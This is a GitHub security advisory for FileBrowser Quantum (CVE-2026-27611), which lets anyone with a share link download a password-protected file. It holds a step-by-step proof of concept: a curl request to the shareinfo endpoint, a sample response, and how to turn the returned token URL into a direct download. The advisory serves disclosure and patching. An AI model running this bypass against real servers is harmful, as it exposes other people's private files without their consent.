# [H] FileBrowser Quantum: Password Protection Not Enforced on Shared File Links 

## Summary
Severity: High
Advisory: GHSA-8vrh-3pm2-v4v6
CVE: CVE-2026-27611
CWE: CWE-200, CWE-288, CWE-602
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-02-25
Source: https://github.com/advisories/GHSA-8vrh-3pm2-v4v6
Type: github-advisory

## Affected
- Go: `github.com/gtsteffaniak/filebrowser/backend` — affected >=0 <0.0.0-20260221163904-dbcfba993b85

## Details
### Summary
When users share password-protected files, the recipient can completely bypass the password and still download the file.

### Details
This happens because the API returns a direct download link in the details of the share, which is accessible to anyone with JUST THE SHARE LINK, even without the password.

### PoC
1. As an authenticated user, create a share for a file, with a password specified in "Optional password" (make sure to allow anonymous access as the PoC doesn't explain how to do this on a share that requires login, but it is also possible to do on a share that requires login, with some small tweaks to the API request)
2. Copy the first link (the clipboard WITHOUT an arrow) because the second one just completely skips the password without any effort required, which was mentioned in another vulnerability (https://github.com/filebrowser/filebrowser/security/advisories/GHSA-3v48-283x-f2w4)

Now, the link that was copied should look like:
https://yourdomain/public/share/yoursharehash
example:
https://example.com/public/share/ngCZzArOyFHUQBmfbvP-pA

Now, make a API request with any api client to GET 
https://yourdomain/public/api/shareinfo?hash=(the share hash from the link)
example:
https://example.com/public/api/shareinfo?hash=ngCZzArOyFHUQBmfbvP-pA

If curl is preferred, a (command line based API client), here's the command:
`curl 'https://yourdomain/public/api/shareinfo?hash=yoursharehash' -H 'Accept: */*'`
example:
`curl 'https://example.com/public/api/shareinfo?hash=ngCZzArOyFHUQBmfbvP-pA' -H 'Accept: */*'`

Example response:
```
{
    "shareTheme": "default",
    "title": "Shared files - IMG_20240814_213703451.jpg",
    "description": "A share has been sent to you to view or download.",
    "disableSidebar": false,
    "source": "/folder",
    "path": "/IMG_20240814_213703451.jpg/",
    "downloadURL": "https://example.com/public/api/raw?hash=ngCZzArOyFHUQBmfbvP-pA\u0026token=uEr4nCNarX6FqlzwmBo8X1rRRASbOrMY.sWSARcKhrVKrEJlqiF-l6RjXK9fMEPYZsMc9DCJ96BQ%3D",
    "shareURL": "https://example.com/public/share/ngCZzArOyFHUQBmfbvP-pA",
    "enforceDarkLightMode": "default",
    "viewMode": "normal",
    "shareType": "normal",
    "sidebarLinks": [
        {
            "name": "Share QR Code and Info",
            "category": "shareInfo",
            "target": "#",
            "icon": "qr_code"
        },
        {
            "name": "Download",
            "category": "download",
            "target": "#",
            "icon": "download"
        }
    ],
    "hasPassword": true
}
```

Look at the downloadURL. It encodes the "&" symbol as "\u0026" so just replace "\u0026" with "&", example: 
https://example.com/public/api/raw?hash=ngCZzArOyFHUQBmfbvP-pA\u0026token=uEr4nCNarX6FqlzwmBo8X1rRRASbOrMY.sWSARcKhrVKrEJlqiF-l6RjXK9fMEPYZsMc9DCJ96BQ%3D
should be changed to:
https://example.com/public/api/raw?hash=ngCZzArOyFHUQBmfbvP-pA&token=uEr4nCNarX6FqlzwmBo8X1rRRASbOrMY.sWSARcKhrVKrEJlqiF-l6RjXK9fMEPYZsMc9DCJ96BQ%3D

Then just copy paste the new link (example: https://example.com/public/api/raw?hash=ngCZzArOyFHUQBmfbvP-pA&token=uEr4nCNarX6FqlzwmBo8X1rRRASbOrMY.sWSARcKhrVKrEJlqiF-l6RjXK9fMEPYZsMc9DCJ96BQ%3D) into any browser, and the file will download. All without giving a password.

### Impact
This affects anyone who shares password-protected files.

## References
- https://github.com/gtsteffaniak/filebrowser/security/advisories/GHSA-8vrh-3pm2-v4v6
- https://nvd.nist.gov/vuln/detail/CVE-2026-27611
- https://github.com/gtsteffaniak/filebrowser/commit/a8c9b9419ec530568991a2f72cec4ed263f99e3c
- https://github.com/gtsteffaniak/filebrowser/commit/c51b0ee9738fa4599b409f47c5bf820ef31b4fe1
- https://github.com/gtsteffaniak/filebrowser
- https://pkg.go.dev/vuln/GO-2026-4546
